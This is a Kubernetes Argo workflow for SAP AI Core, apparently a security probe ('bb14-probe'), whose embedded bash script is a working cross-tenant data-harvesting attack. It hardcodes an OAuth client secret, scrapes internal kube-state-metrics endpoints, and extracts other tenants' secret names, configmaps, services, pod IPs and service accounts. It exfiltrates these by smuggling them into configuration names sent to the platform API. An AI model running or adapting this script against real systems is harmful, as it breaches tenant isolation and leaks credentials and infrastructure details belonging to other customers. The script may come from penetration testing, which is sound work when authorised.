apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "49.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        # V49: Deep KSM extraction - secrets, configmaps, services across tenants
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='

        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
          | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)

        save() {
          local name="v49-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
          curl -sk -X POST "${API}/v2/lm/configurations" \
            -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
        }

        KSM_PODS="100.106.241.163"
        KSM_MULTI="100.110.128.70"
        KSM_CUSTOM="100.110.192.195"

        # 1. KSM-multi: check for secrets, configmaps, services metrics
        echo "=== METRIC TYPES ===" >&2
        MULTI=$(curl -sk --connect-timeout 20 "http://${KSM_MULTI}:8080/metrics" 2>&1)

        # All metric families
        FAMILIES=$(echo "$MULTI" | grep '^# HELP' | awk '{print $3}' | sort -u)
        FCOUNT=$(echo "$FAMILIES" | wc -l | tr -d ' ')
        save "multi-families-${FCOUNT}"

        # Save metric families in batches
        BATCH=""
        BNUM=1
        while IFS= read -r fam; do
          if [ -n "$fam" ]; then
            BATCH="${BATCH}${fam}."
            if [ ${#BATCH} -gt 180 ]; then
              save "multi-fam-${BNUM}-${BATCH}"
              BATCH=""
              BNUM=$((BNUM + 1))
            fi
          fi
        done <<< "$FAMILIES"
        [ -n "$BATCH" ] && save "multi-fam-${BNUM}-${BATCH}"

        # 2. Secret metrics specifically
        SECRETS=$(echo "$MULTI" | grep -i 'kube_secret')
        if [ -n "$SECRETS" ]; then
          SEC_COUNT=$(echo "$SECRETS" | wc -l | tr -d ' ')
          save "secrets-lines-${SEC_COUNT}"
          # Secret names from other tenants
          SEC_NAMES=$(echo "$SECRETS" | grep 'namespace="rg-\|namespace="mt-' | grep -v 'rg-3ba0e0a4' | grep -o 'secret="[^"]*"' | sort -u | head -15 | tr '\n' '|')
          save "xtenant-secrets-${SEC_NAMES}"
        else
          save "secrets-absent-from-multi"
        fi

        # 3. ConfigMap metrics
        CMS=$(echo "$MULTI" | grep -i 'kube_configmap')
        if [ -n "$CMS" ]; then
          CM_NAMES=$(echo "$CMS" | grep -v 'rg-3ba0e0a4' | grep -o 'configmap="[^"]*"' | sort -u | head -10 | tr '\n' '|')
          save "configmaps-${CM_NAMES}"
        else
          save "configmaps-absent"
        fi

        # 4. Service metrics
        SVCS=$(echo "$MULTI" | grep -i 'kube_service')
        if [ -n "$SVCS" ]; then
          SVC_NAMES=$(echo "$SVCS" | grep -v 'rg-3ba0e0a4' | grep -o 'service="[^"]*"' | sort -u | head -15 | tr '\n' '|')
          save "services-${SVC_NAMES}"
        else
          save "services-absent"
        fi

        # 5. KSM-pods: more detail on cross-ns pods
        echo "=== KSM-PODS DEEP ===" >&2
        PODS=$(curl -sk --connect-timeout 20 "http://${KSM_PODS}:8080/metrics" 2>&1)
        PODS_SIZE=$(echo "$PODS" | wc -c | tr -d ' ')
        save "pods-size-${PODS_SIZE}"

        # Pod families available
        POD_FAMS=$(echo "$PODS" | grep '^# HELP' | awk '{print $3}' | sort -u | head -20 | tr '\n' '|')
        save "pods-families-${POD_FAMS}"

        # Container images from pods in other namespaces
        XIMAGES=$(echo "$PODS" | grep 'kube_pod_container_info' | grep -v 'rg-3ba0e0a4' | grep -o 'image="[^"]*"' | sort -u | head -10 | tr '\n' '|')
        save "pods-ximages-${XIMAGES}"

        # Container names
        XCONTAINERS=$(echo "$PODS" | grep 'kube_pod_container_info' | grep -v 'rg-3ba0e0a4' | grep -o 'container="[^"]*"' | sort -u | head -10 | tr '\n' '|')
        save "pods-xcontainers-${XCONTAINERS}"

        # Pod IPs
        XPODIPS=$(echo "$PODS" | grep 'kube_pod_info' | grep -v 'rg-3ba0e0a4' | grep -o 'pod_ip="[^"]*"' | sort -u | head -10 | tr '\n' '|')
        save "pods-xpodips-${XPODIPS}"

        # Service accounts used by pods
        XSA=$(echo "$PODS" | grep 'kube_pod_spec_' | grep -v 'rg-3ba0e0a4' | grep -o 'service_account="[^"]*"' | sort -u | head -10 | tr '\n' '|')
        save "pods-xsa-${XSA}"

        # 6. KSM-custom: what CRD types exist
        echo "=== KSM-CUSTOM ===" >&2
        CUSTOM=$(curl -sk --connect-timeout 15 "http://${KSM_CUSTOM}:8080/metrics" 2>&1)
        CUSTOM_FAMS=$(echo "$CUSTOM" | grep '^# HELP' | awk '{print $3}' | sort -u | head -20 | tr '\n' '|')
        save "custom-families-${CUSTOM_FAMS}"

        # CRD groups
        CRD_GROUPS=$(echo "$CUSTOM" | grep -o 'customresource_group="[^"]*"' | sort -u | head -10 | tr '\n' '|')
        save "custom-crd-groups-${CRD_GROUPS}"

        echo "V49 DONE" >&2
